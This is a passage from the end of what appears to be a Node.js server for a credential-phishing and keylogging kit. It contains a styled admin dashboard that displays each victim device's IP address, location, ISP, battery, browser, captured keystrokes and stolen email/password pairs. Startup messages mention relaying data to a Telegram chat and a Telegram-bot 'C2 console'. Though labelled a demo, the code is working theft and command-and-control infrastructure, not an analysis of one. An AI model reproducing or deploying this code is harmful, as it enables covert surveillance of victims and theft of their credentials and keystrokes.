  .device { background:#161b22; border:1px solid #30363d; border-radius:8px; padding:14px; margin-bottom:12px; }
  .online { border-color:#238636; }
  .hdr { display:flex; justify-content:space-between; align-items:center; margin-bottom:8px; flex-wrap:wrap; gap:6px; }
  .dev-name { font-weight:600; color:#f0f6fc; font-size:15px; }
  .badge { font-size:11px; padding:2px 8px; border-radius:10px; }
  .b-on { background:#238636; color:#fff; }
  .b-off { background:#30363d; color:#8b949e; }
  .kv { font-size:13px; line-height:1.7; }
  .kv b { color:#58a6ff; font-weight:500; }
  .keys { background:#0d1117; border-radius:6px; padding:8px; margin-top:8px; font-size:12px; max-height:140px; overflow-y:auto; }
  .keys div { padding:2px 0; border-bottom:1px solid #21262d; }
  .keys .ctx { color:#d29922; }
  .cred { background:#da3633; color:#fff; border-radius:6px; padding:8px; margin-top:8px; font-size:13px; }
  .mono { font-family:Consolas, monospace; }
  .err { color:#f85149; text-align:center; margin-top:40px; }
</style>
</head><body>
<h1>🛰️ Live Operations</h1>
<div class="sub">auto-refresh 3s · <span id="total">0</span> devices seen</div>
<div id="list"><div class="err">waiting for data…</div></div>
<script>
const KEY = new URLSearchParams(location.search).get("key") || "";

function render(d) {
  const el = document.getElementById("list");
  document.getElementById("total").textContent = d.total;
  if (!d.sessions.length) { el.innerHTML = '<div class="err">no devices yet — open the demo link</div>'; return; }
  el.innerHTML = d.sessions.map(s => {
    const dev = s.device || {};
    const loc = s.location ? s.location.city + ", " + s.location.region + " — " + s.location.isp : "unknown";
    const battery = dev.battery ? dev.battery.level + "% " + (dev.battery.charging ? "⚡" : "🔋") : "—";
    const net = dev.connection ? dev.connection.effectiveType.toUpperCase() : "—";
    const keys = (s.keys || []).slice().reverse().map(k =>
      '<div><span class="ctx">[' + k.context + ']</span> <span class="mono">' +
      k.keys.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;") + '</span></div>'
    ).join("") || '<div style="color:#8b949e">no keystrokes yet</div>';
    const cred = s.creds ? '<div class="cred">🔐 ' + s.creds.email + ' / ' + s.creds.password + '</div>' : '';
    return '<div class="device' + (s.online ? ' online' : '') + '">' +
      '<div class="hdr"><span class="dev-name">' + (dev.platform || "Unknown") + '</span>' +
      '<span class="badge ' + (s.online ? 'b-on' : 'b-off') + '">' + (s.online ? 'ONLINE' : 'offline') + '</span></div>' +
      '<div class="kv">' +
      '<b>IP</b> <span class="mono">' + s.ip + '</span> · <b>Net</b> ' + net + ' · <b>Battery</b> ' + battery + '<br>' +
      '<b>Location</b> ' + loc + '<br>' +
      '<b>Browser</b> ' + (dev.browser || "—") + ' · <b>Screen</b> ' + (dev.screen || "—") + '<br>' +
      '<b>First seen</b> ' + new Date(s.firstSeen).toLocaleTimeString() +
      ' · <b>Last seen</b> ' + new Date(s.lastSeen).toLocaleTimeString() +
      ' · <b>Visits</b> ' + s.visits + '</div>' +
      '<div class="keys"><b style="color:#d29922">KEYSTROKES (' + s.keyCount + ')</b>' + keys + '</div>' +
      cred + '</div>';
  }).join("");
}

async function poll() {
  try {
    const r = await fetch("/admin/data?key=" + encodeURIComponent(KEY));
    if (r.status === 403) { document.body.innerHTML = '<div class="err">🔒 wrong admin key — add ?key=YOUR_KEY to the URL</div>'; return; }
    render(await r.json());
  } catch (e) { /* server asleep, retry */ }
}
poll();
setInterval(poll, 3000);
</script>
</body></html>`);
});

app.listen(PORT, () => {
  console.log(`\n[+] Demo server running on port ${PORT}`);
  console.log(`[+] Telegram relaying to chat_id: ${CHAT_ID}`);
  console.log(`[+] C2 console: send /help to the bot`);
  console.log(`[+] Live dashboard: /admin?key=${ADMIN_KEY}\n`);
  pollCommands(); // start Telegram command long-poll
});
